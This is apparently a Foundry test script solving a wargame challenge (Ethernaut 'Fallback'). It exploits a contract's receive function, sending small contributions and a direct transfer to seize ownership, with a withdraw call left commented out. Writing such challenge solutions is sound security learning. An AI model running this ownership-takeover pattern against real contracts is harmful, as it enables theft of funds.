// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../instances/Ilevel1.sol";

contract POC is Test {
    Fallback level1 =
        Fallback(payable(0x4a6B165A22bE750fE34A623C2Ee96836ed6b0Cd3));

    function test() external {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}(); //call the contribute function with some ether/wei
        level1.getContribution(); //get the contribution for our user to make sure its updated
        //address(level1).call{value: 1 wei}("");
        (payable(address(level1))).transfer(1 wei); //make a transfer call to trigger the receive function and become the new owner
        level1.owner();
        //level1.withdraw();

        vm.stopBroadcast();
    }
}
